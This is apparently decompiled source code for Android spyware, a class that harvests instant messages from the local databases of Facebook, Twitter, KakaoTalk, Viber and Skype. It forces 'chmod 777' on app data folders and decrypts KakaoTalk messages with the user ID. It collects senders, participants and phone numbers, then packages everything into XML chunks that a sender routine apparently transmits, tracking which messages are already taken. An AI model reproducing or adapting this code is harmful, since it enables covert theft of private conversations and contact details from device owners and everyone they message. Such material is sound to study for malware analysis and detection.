package com.network.android;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Handler;
import android.util.Xml;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import java.io.File;
import java.io.StringWriter;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;
import org.xmlpull.v1.XmlSerializer;

public class p {

    /* renamed from: a  reason: collision with root package name */
    static Pattern f107a = Pattern.compile("\\d{4,}+.*db$");
    static final Object b = new Object();
    private static HashMap c = null;
    private static String d;

    private static String a(SQLiteDatabase sQLiteDatabase) {
        Cursor cursor = null;
        if (d != null) {
            a.a("kakaoGetContentIM addImSingleEntryKaKao getOwnerUserId ownerUserId: " + d);
            return d;
        }
        try {
            a.a("kakaoGetContentIM addImSingleEntryKaKao getOwnerUserId query: " + "SELECT chat_logs.user_id  FROM chat_logs LEFT JOIN friends f ON chat_logs.user_id=f.id WHERE f.id IS NULL LIMIT 1");
            Cursor rawQuery = sQLiteDatabase.rawQuery("SELECT chat_logs.user_id  FROM chat_logs LEFT JOIN friends f ON chat_logs.user_id=f.id WHERE f.id IS NULL LIMIT 1", null);
            if (rawQuery != null && rawQuery.moveToFirst()) {
                d = rawQuery.getString(0);
                a.a("kakaoGetContentIM addImSingleEntryKaKao getOwnerUserId FATCHED first ownerUserId: " + d);
            }
            if (rawQuery != null) {
                rawQuery.close();
            }
        } catch (Throwable th) {
            if (0 != 0) {
                cursor.close();
            }
            throw th;
        }
        return d;
    }

    private static String a(String str, String str2, String str3) {
        Throwable th;
        String str4;
        try {
            a.a(str2 + "GetContentIM addImSingleEntryKaKao decryptKaKao user_id: " + str3 + ",encrypted msg: " + str);
            str4 = new com.network.c.a(Long.parseLong(str3)).a(str);
            try {
                a.a(str2 + "GetContentIM addImSingleEntryKaKao decryptKaKao decrypted msg: " + str4);
            } catch (Throwable th2) {
                th = th2;
                a.a(str2 + "GetContentIM addImSingleEntryKaKao decryptKaKao Throwable- " + th.getMessage(), th);
                b.a(1, 1022, str2);
                return str4;
            }
        } catch (Throwable th3) {
            th = th3;
            str4 = str;
            a.a(str2 + "GetContentIM addImSingleEntryKaKao decryptKaKao Throwable- " + th.getMessage(), th);
            b.a(1, 1022, str2);
            return str4;
        }
        return str4;
    }

    protected static List a(String str, Pattern pattern, String str2) {
        a.a(str2 + "GetContentIM getDBFilePath dbFileNamePattern : " + pattern.pattern());
        File file = new File(str);
        LinkedList linkedList = new LinkedList();
        if (file.isDirectory()) {
            try {
                m.c("chmod 777 " + file.getAbsolutePath());
                File[] listFiles = file.listFiles();
                for (int i = 0; i < listFiles.length; i++) {
                    String name = listFiles[i].getName();
                    m.c("chmod 777 " + listFiles[i].getAbsolutePath());
                    if (pattern.matcher(name).matches()) {
                        a.a(str2 + "GetContentIM getDBFilePath maches fileName: " + name);
                        linkedList.add(listFiles[i].getAbsolutePath());
                    } else {
                        a.a(str2 + "GetContentIM getDBFilePath does not maches fileName: " + name);
                    }
                }
            } catch (Throwable th) {
                a.a(str2 + "getDBFilePath iter exception- " + th.getMessage(), th);
            }
        }
        a.a(str2 + "GetContentIM getDBFilePaths found " + linkedList.size());
        return linkedList;
    }

    /* JADX DEBUG: Failed to insert an additional move for type inference into block B:24:0x00c8 */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r1v2 */
    /* JADX WARN: Type inference failed for: r1v3, types: [java.util.Map] */
    /* JADX WARN: Type inference failed for: r0v24, types: [java.util.Map] */
    /* JADX WARN: Type inference failed for: r3v18, types: [java.util.Map, java.util.HashMap] */
    /* JADX WARN: Type inference failed for: r0v53, types: [java.util.Map, java.util.HashMap, java.lang.Object] */
    /* JADX WARNING: Code restructure failed: missing block: B:43:0x01af, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:45:0x01b2, code lost:
        r2.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:49:0x01b9, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:50:0x01ba, code lost:
        r1 = null;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:51:0x01bc, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:52:0x01bd, code lost:
        r2 = r1;
        r1 = null;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:53:0x01c1, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:54:0x01c2, code lost:
        r2 = r1;
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:55:0x01c6, code lost:
        r1 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:56:0x01c7, code lost:
        r1 = r2;
        r2 = r0;
        r0 = r1;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:57:0x01cc, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:58:0x01cd, code lost:
        r1 = r2;
        r2 = r3;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x00ca  */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x00cf  */
    /* JADX WARNING: Removed duplicated region for block: B:43:0x01af A[ExcHandler: all (th java.lang.Throwable), Splitter:B:1:0x0001] */
    /* JADX WARNING: Removed duplicated region for block: B:45:0x01b2  */
    /* JADX WARNING: Removed duplicated region for block: B:59:0x01d0  */
    /* JADX WARNING: Unknown variable types count: 3 */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static java.util.Map a(java.lang.String r7, java.lang.String r8, android.database.sqlite.SQLiteDatabase r9, java.lang.String r10) {
        /*
        // Method dump skipped, instructions count: 476
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.p.a(java.lang.String, java.lang.String, android.database.sqlite.SQLiteDatabase, java.lang.String):java.util.Map");
    }

    public static void a(Context context, Cursor cursor, String str, String str2, Map map, SQLiteDatabase sQLiteDatabase, String str3, String str4) {
        Throwable th;
        StringWriter stringWriter;
        XmlSerializer xmlSerializer;
        a.a(str + "GetContentIM addImEntries Messages count : " + cursor.getCount());
        if (cursor.getCount() > 0) {
            int i = 1;
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter2 = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter2);
            newSerializer.startTag("", "imSession");
            while (cursor.moveToNext()) {
                int i2 = i + 1;
                try {
                    a.a(str + "GetContentIM addImEntries buffer lenth: " + stringWriter2.getBuffer().length() + ",  index: " + i2);
                    if (stringWriter2.getBuffer().length() > 97280) {
                        newSerializer.endTag("", "imSession");
                        SmsReceiver.a(newSerializer);
                        j.a(stringWriter2.toString(), context);
                        j.a(context);
                        a.a(str + "GetContentIM addImEntries 100k chunk buffer lenth: " + stringWriter2.getBuffer().length() + ",  index: " + i2);
                        Thread.sleep(300);
                        XmlSerializer newSerializer2 = Xml.newSerializer();
                        try {
                            stringWriter = new StringWriter();
                            try {
                                SmsReceiver.a(newSerializer2, stringWriter);
                                newSerializer2.startTag("", "imSession");
                                xmlSerializer = newSerializer2;
                            } catch (Throwable th2) {
                                newSerializer = newSerializer2;
                                th = th2;
                                stringWriter2 = stringWriter;
                                a.a(str + "GetContentIM addImEntries iter - " + th.getMessage(), th);
                                i = i2;
                            }
                        } catch (Throwable th3) {
                            newSerializer = newSerializer2;
                            th = th3;
                            a.a(str + "GetContentIM addImEntries iter - " + th.getMessage(), th);
                            i = i2;
                        }
                    } else {
                        stringWriter = stringWriter2;
                        xmlSerializer = newSerializer;
                    }
                    try {
                        if ("facebook".equals(str)) {
                            a(cursor, xmlSerializer, str, map);
                            newSerializer = xmlSerializer;
                            i = i2;
                            stringWriter2 = stringWriter;
                        } else if ("twitter".equals(str)) {
                            try {
                                a.a(str + "GetContentIM addImSingleEntryTwitter index: " + cursor.getPosition());
                                String string = cursor.getString(cursor.getColumnIndex((String) map.get("text")));
                                String string2 = cursor.getString(cursor.getColumnIndex((String) map.get("msg_id")));
                                String string3 = cursor.getString(cursor.getColumnIndex((String) map.get("thread_id")));
                                String string4 = cursor.getString(cursor.getColumnIndex((String) map.get("timestamp")));
                                String string5 = cursor.getString(cursor.getColumnIndex((String) map.get("sender")));
                                String string6 = cursor.getString(cursor.getColumnIndex((String) map.get("participants")));
                                String string7 = cursor.getString(9);
                                String string8 = cursor.getString(8);
                                String string9 = cursor.getString(11);
                                String string10 = cursor.getString(10);
                                if (string == null || string.length() == 0) {
                                    a.a(str + "GetContentIM addImSingleEntryTwitter EMPTY MESSAGE -> CONTINUE: " + cursor.getPosition());
                                    newSerializer = xmlSerializer;
                                    i = i2;
                                    stringWriter2 = stringWriter;
                                } else {
                                    a.a(str + "GetContentIM addImSingleEntryTwittermsg:" + string + ", sender id:" + string5);
                                    a.a(str + "GetContentIM addImSingleEntryTwitter timestamp_ms:" + string4 + ", participants id:" + string6);
                                    try {
                                        a.a(str + "GetContentIM addImSingleEntryTwitter by date:" + new Date(Long.parseLong(string4)).toString());
                                    } catch (Throwable th4) {
                                    }
                                    String str5 = string8 + ", " + string10;
                                    String str6 = string7 + ", " + string9;
                                    a.a(str + "GetContentIM addImSingleEntryTwitter participantsSb: " + str5);
                                    a.a(str + "GetContentIM addImSingleEntryTwitter participantsNumbersSb: " + str6);
                                    a(xmlSerializer, string3, string, string2, string4, string7, string8, str5, str6, str);
                                    newSerializer = xmlSerializer;
                                    i = i2;
                                    stringWriter2 = stringWriter;
                                }
                            } catch (Throwable th5) {
                                a.a(str + "GetContentIM addImSingleEntryTwitter iter exception- " + th5.getMessage(), th5);
                                newSerializer = xmlSerializer;
                                i = i2;
                                stringWriter2 = stringWriter;
                            }
                        } else if ("kakao".equals(str)) {
                            a(cursor, xmlSerializer, str, map, sQLiteDatabase);
                            newSerializer = xmlSerializer;
                            i = i2;
                            stringWriter2 = stringWriter;
                        } else if ("viber".equals(str)) {
                            b(cursor, xmlSerializer, str, map);
                            newSerializer = xmlSerializer;
                            i = i2;
                            stringWriter2 = stringWriter;
                        } else {
                            if ("skype".equals(str)) {
                                a(cursor, xmlSerializer, str, map, sQLiteDatabase, str3, str4);
                            }
                            newSerializer = xmlSerializer;
                            i = i2;
                            stringWriter2 = stringWriter;
                        }
                    } catch (Throwable th6) {
                        th = th6;
                        newSerializer = xmlSerializer;
                        stringWriter2 = stringWriter;
                        a.a(str + "GetContentIM addImEntries iter - " + th.getMessage(), th);
                        i = i2;
                    }
                } catch (Throwable th7) {
                    th = th7;
                    a.a(str + "GetContentIM addImEntries iter - " + th.getMessage(), th);
                    i = i2;
                }
            }
            newSerializer.endTag("", "imSession");
            SmsReceiver.a(newSerializer);
            j.a(stringWriter2.toString(), context);
            j.a(context);
            cursor.moveToLast();
            String string11 = cursor.getString(cursor.getColumnIndex(str2));
            try {
                a.a(str + "GetContentIM addImEntries index after dump: " + string11 + ", by date:" + new Date(Long.parseLong(string11)).toString());
            } catch (Exception e) {
            }
            SharedPreferences.Editor edit = context.getSharedPreferences("NetworkMessages", 0).edit();
            edit.putString(str3 == null ? h.b(str) : h.b(str + "-" + str3), string11);
            edit.commit();
            return;
        }
        a.a(str + "GetContentIM addImEntries NO NEW MESSAGES to send");
    }

    private static void a(Cursor cursor, XmlSerializer xmlSerializer, String str, Map map) {
        String str2;
        String str3;
        try {
            a.a(str + "GetContentIM addImSingleEntryFaceebook index: " + cursor.getPosition());
            String string = cursor.getString(cursor.getColumnIndex((String) map.get("text")));
            String string2 = cursor.getString(cursor.getColumnIndex((String) map.get("msg_id")));
            String string3 = cursor.getString(cursor.getColumnIndex((String) map.get("thread_id")));
            String string4 = cursor.getString(cursor.getColumnIndex((String) map.get("sender")));
            String string5 = cursor.getString(cursor.getColumnIndex((String) map.get("timestamp")));
            String string6 = cursor.getString(cursor.getColumnIndex((String) map.get("participants")));
            if (string == null || string.length() == 0) {
                a.a(str + "GetContentIM addImSingleEntryFaceebook EMPTY MESSAGE -> \tCONTINUE: " + cursor.getPosition());
                return;
            }
            a.a(str + "GetContentIM addImSingleEntryFaceebook msg:" + string + ", sender jSon" + string4);
            a.a(str + "GetContentIM addImSingleEntryFaceebook timestamp_ms " + string5 + ", participants jSon" + string6);
            try {
                a.a(str + "GetContentIM addImSingleEntryFaceebook by date:" + new Date(Long.parseLong(string5)).toString());
            } catch (Throwable th) {
            }
            String str4 = "unknown";
            String str5 = "unknown";
            StringBuilder sb = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            try {
                JSONObject jSONObject = new JSONObject(string4);
                str4 = jSONObject.optString("user_key").toString();
                str5 = jSONObject.optString("name").toString();
                a.a(str + "GetContentIM addImSingleEntryFaceebook fromName:" + str5 + ", fromContactId:" + str4);
                str2 = str4;
                str3 = str5;
            } catch (Throwable th2) {
                a.a(str + "GetContentIM addImSingleEntryFaceebook json object parser exception- " + th2.getMessage(), th2);
                str2 = str4;
                str3 = str5;
            }
            LinkedList linkedList = new LinkedList();
            LinkedList linkedList2 = new LinkedList();
            a(str, string6, linkedList, linkedList2);
            for (int i = 0; i < linkedList.size() - 1; i++) {
                sb.append((String) linkedList.get(i));
                sb.append(", ");
                sb2.append((String) linkedList2.get(i));
                sb2.append(", ");
            }
            sb.append((String) linkedList.get(linkedList.size() - 1));
            sb2.append((String) linkedList2.get(linkedList.size() - 1));
            a.a(str + "GetContentIM addImSingleEntryFaceebook participantsSb: " + ((Object) sb));
            a.a(str + "GetContentIM addImSingleEntryFaceebook participantsNumbersSb: " + ((Object) sb2));
            a(xmlSerializer, string3, string, string2, string5, str2, str3, sb.toString(), sb2.toString(), str);
        } catch (Throwable th3) {
            a.a(str + "GetContentIM addImSingleEntryFaceebook iter exception- " + th3.getMessage(), th3);
        }
    }

    private static void a(Cursor cursor, XmlSerializer xmlSerializer, String str, Map map, SQLiteDatabase sQLiteDatabase) {
        try {
            a.a(str + "GetContentIM addImSingleEntryKaKao index: " + cursor.getPosition());
            String string = cursor.getString(cursor.getColumnIndex((String) map.get("text")));
            String string2 = cursor.getString(cursor.getColumnIndex((String) map.get("msg_id")));
            String string3 = cursor.getString(cursor.getColumnIndex((String) map.get("thread_id")));
            String string4 = cursor.getString(cursor.getColumnIndex((String) map.get("timestamp")));
            String string5 = cursor.getString(cursor.getColumnIndex((String) map.get("sender")));
            String string6 = cursor.getString(6);
            if (string == null || string.length() == 0) {
                a.a(str + "GetContentIM addImSingleEntryKaKao EMPTY MESSAGE -> CONTINUE: " + cursor.getPosition());
                return;
            }
            a.a(str + "GetContentIM addImSingleEntryKaKao encrypted msg: " + string);
            String a2 = a(string, str, string5);
            a.a(str + "GetContentIM addImSingleEntryKaKao decrypted msg: " + a2);
            try {
                a.a(str + "GetContentIM addImSingleEntryKaKao by date:" + new Date(1000 * Long.parseLong(string4)).toString());
            } catch (Throwable th) {
            }
            a.a(str + "GetContentIM addImSingleEntryKaKao memebers:" + string6 + ", sender id:" + string5);
            String replace = string6.replace("[", "").replace("]", "");
            String a3 = a(sQLiteDatabase);
            if (a3 == null || a3.length() == 0) {
                b.a(1, 1022, "LOG_ERR_KAKAOTALK_FAILED_ENCRYPTION");
                return;
            }
            Map a4 = a(a3, string5, sQLiteDatabase, str);
            a.a(str + "GetContentIM addImSingleEntryKakao fatched fromName: " + ((String) a4.get("friends.name")) + ", fromNumber:" + ((String) a4.get("friends.phone_number")));
            String str2 = (String) a4.get("friends.phone_number");
            String str3 = (String) a4.get("friends.name");
            StringBuilder sb = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            String[] split = replace.split(",");
            for (int i = 0; i < split.length - 1; i++) {
                String str4 = split[i];
                a.a(str + "GetContentIM addImSingleEntryKaKao memeber ID:" + str4);
                Map a5 = a(a3, str4, sQLiteDatabase, str);
                a.a(str + "GetContentIM addImSingleEntryKakao getContact fatched name: " + ((String) a5.get("friends.name")) + ", number:" + ((String) a5.get("friends.phone_number")));
                sb.append(((String) a5.get("friends.name")) + ", ");
                sb2.append(((String) a5.get("friends.phone_number")) + ", ");
            }
            String str5 = split[split.length - 1];
            a.a(str + "GetContentIM addImSingleEntryKaKao last memeber ID:" + str5);
            Map a6 = a(a3, str5, sQLiteDatabase, str);
            a.a(str + "GetContentIM addImSingleEntryKakao getContact last fatched name: " + ((String) a6.get("friends.name")) + ", number:" + ((String) a6.get("friends.phone_number")));
            sb.append((String) a6.get("friends.name"));
            sb2.append((String) a6.get("friends.phone_number"));
            a.a(str + "GetContentIM addImSingleEntryFaceebook participantsSb: " + ((Object) sb));
            a.a(str + "GetContentIM addImSingleEntryFaceebook participantsNumbersSb: " + ((Object) sb2));
            a(xmlSerializer, string3, a2, string2, string4, str2, str3, sb.toString(), sb2.toString(), str);
        } catch (Throwable th2) {
            a.a(str + "GetContentIM addImSingleEntryKaKao iter exception- " + th2.getMessage(), th2);
        }
    }

    private static void a(Cursor cursor, XmlSerializer xmlSerializer, String str, Map map, SQLiteDatabase sQLiteDatabase, String str2, String str3) {
        try {
            a.a(str + "GetContentIM addImSingleEntrySkype index: " + cursor.getPosition());
            String string = cursor.getString(cursor.getColumnIndex((String) map.get("text")));
            String string2 = cursor.getString(cursor.getColumnIndex((String) map.get("msg_id")));
            String string3 = cursor.getString(cursor.getColumnIndex((String) map.get("thread_id")));
            String string4 = cursor.getString(cursor.getColumnIndex((String) map.get("timestamp")));
            String string5 = cursor.getString(cursor.getColumnIndex((String) map.get("senderName")));
            String string6 = cursor.getString(cursor.getColumnIndex((String) map.get("senderUserId")));
            String str4 = str3 + "," + cursor.getString(cursor.getColumnIndex("displayname"));
            a.a(str + "GetContentIM addImSingleEntrySkype: Look for participant-ids");
            StringBuilder sb = new StringBuilder();
            Cursor rawQuery = sQLiteDatabase.rawQuery("SELECT identity FROM Participants WHERE convo_id=" + string3, null);
            while (rawQuery.moveToNext()) {
                String string7 = rawQuery.getString(rawQuery.getColumnIndex("identity"));
                if (sb.length() > 0) {
                    sb.append(",");
                }
                sb.append(string7);
            }
            if (string == null || string.length() == 0) {
                a.a(str + "GetContentIM addImSingleEntrySkype EMPTY MESSAGE -> CONTINUE: " + cursor.getPosition());
                return;
            }
            a.a(str + "GetContentIM addImSingleEntrySkype:" + string + ", fromName:" + string5 + ", fromNumber:" + string6);
            a.a(str + "GetContentIM addImSingleEntrySkype timestamp_ms:" + string4);
            try {
                a.a(str + "GetContentIM addImSingleEntrySkype by date:" + new Date(Long.parseLong(string4)).toString());
            } catch (Throwable th) {
            }
            a.a(str + "GetContentIM addImSingleEntrySkype participantsSb: " + str4);
            a.a(str + "GetContentIM addImSingleEntrySkype participantsNumbersSb: " + ((Object) sb));
            a(xmlSerializer, string3 + "-" + str2, string, string2, string4, string6, string5, str4, sb.toString(), str);
        } catch (Throwable th2) {
            a.a(str + "GetContentIM addImSingleEntrySkype iter exception- " + th2.getMessage(), th2);
        }
    }

    public static void a(Handler handler, Context context, boolean z, String str, String str2, String str3, String str4, String str5, String str6, String str7, Map map, short s) {
        a(handler, context, z, str, str2, str3, str4, str5, str6, str7, map, s, null);
    }

    public static void a(Handler handler, Context context, boolean z, String str, String str2, String str3, String str4, String str5, String str6, String str7, Map map, short s, String str8) {
        handler.post(new q(str, str3, str2, str4, str5, str7, str8, z, str6, context, s, map));
    }

    private static void a(String str, String str2, List list, List list2) {
        try {
            JSONArray jSONArray = new JSONArray(str2);
            int length = jSONArray.length();
            for (int i = 0; i < length; i++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                String str3 = jSONObject.optString("user_key").toString();
                String str4 = jSONObject.optString("name").toString();
                a.a(str + "GetContentIM name:" + str4 + ", contactId:" + str3);
                list.add(str4);
                list2.add(str3);
            }
        } catch (Throwable th) {
            a.a(str + "GetContentIM json parser exception- " + th.getMessage(), th);
        }
    }

    private static void a(XmlSerializer xmlSerializer, String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9) {
        try {
            a.a(str9 + "GetContentIM serializeImSingleEntry start");
            if (!"kakao".equals(str9) && !"skype".equals(str9)) {
                str4 = m.a(str4);
            }
            xmlSerializer.startTag("", "imEntry");
            xmlSerializer.attribute("", "recordId", str3);
            xmlSerializer.attribute("", "sessionId", str);
            xmlSerializer.attribute("", "from", str5);
            xmlSerializer.attribute("", "platform", str9);
            xmlSerializer.attribute("", "timestamp", str4);
            xmlSerializer.startTag("", "chat");
            m.a(xmlSerializer, str6 + ": " + str2);
            xmlSerializer.endTag("", "chat");
            xmlSerializer.startTag("", "participants");
            m.a(xmlSerializer, str7);
            xmlSerializer.endTag("", "participants");
            xmlSerializer.startTag("", "participantNumbers");
            m.a(xmlSerializer, str8);
            xmlSerializer.endTag("", "participantNumbers");
            xmlSerializer.endTag("", "imEntry");
            a.a(str9 + "GetContentIM serializeImSingleEntry end");
        } catch (Throwable th) {
            a.a(str9 + "serializeImSingleEntry iter exception- " + th.getMessage(), th);
        }
    }

    private static void b(Cursor cursor, XmlSerializer xmlSerializer, String str, Map map) {
        try {
            a.a(str + "GetContentIM addImSingleEntryViber index: " + cursor.getPosition());
            String string = cursor.getString(cursor.getColumnIndex((String) map.get("text")));
            String string2 = cursor.getString(cursor.getColumnIndex((String) map.get("msg_id")));
            String string3 = cursor.getString(cursor.getColumnIndex((String) map.get("thread_id")));
            String string4 = cursor.getString(cursor.getColumnIndex((String) map.get("timestamp")));
            String string5 = cursor.getString(cursor.getColumnIndex((String) map.get("sender")));
            StringBuilder sb = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            for (int i = 1; i <= 8; i++) {
                String string6 = cursor.getString(cursor.getColumnIndex("id" + i));
                String string7 = cursor.getString(cursor.getColumnIndex("type" + i));
                String string8 = cursor.getString(cursor.getColumnIndex("number" + i));
                String string9 = cursor.getString(cursor.getColumnIndex("name" + i));
                if (!string6.equals("0")) {
                    if (string7.equals("0") && string9 == null) {
                        string8 = "-";
                        string9 = "SELF";
                    }
                    if (sb.length() > 0) {
                        sb.append(',');
                    }
                    if (sb2.length() > 0) {
                        sb2.append(',');
                    }
                    sb.append(string9);
                    sb2.append(string8);
                }
            }
            String string10 = cursor.getString(cursor.getColumnIndex("sender_type"));
            String string11 = cursor.getString(cursor.getColumnIndex("sender_number"));
            String string12 = cursor.getString(cursor.getColumnIndex((String) map.get("senderName")));
            if (string10.equals("0") && string12 == null) {
                string11 = "";
                string12 = "OUTGOING";
            }
            if (string == null || string.length() == 0) {
                a.a(str + "GetContentIM addImSingleEntryViber EMPTY MESSAGE -> CONTINUE: " + cursor.getPosition());
                return;
            }
            a.a(str + "GetContentIM addImSingleEntryViber:" + string + ", sender id:" + string5);
            a.a(str + "GetContentIM addImSingleEntryViber timestamp_ms:" + string4);
            try {
                a.a(str + "GetContentIM addImSingleEntryViber by date:" + new Date(Long.parseLong(string4)).toString());
            } catch (Throwable th) {
            }
            a.a(str + "GetContentIM addImSingleEntryViber participantsSb: " + ((Object) sb));
            a.a(str + "GetContentIM addImSingleEntryViber participantsNumbersSb: " + ((Object) sb2));
            a(xmlSerializer, string3, string, string2, string4, string11, string12, sb.toString(), sb2.toString(), str);
        } catch (Throwable th2) {
            a.a(str + "GetContentIM addImSingleEntryViber iter exception- " + th2.getMessage(), th2);
        }
    }
}
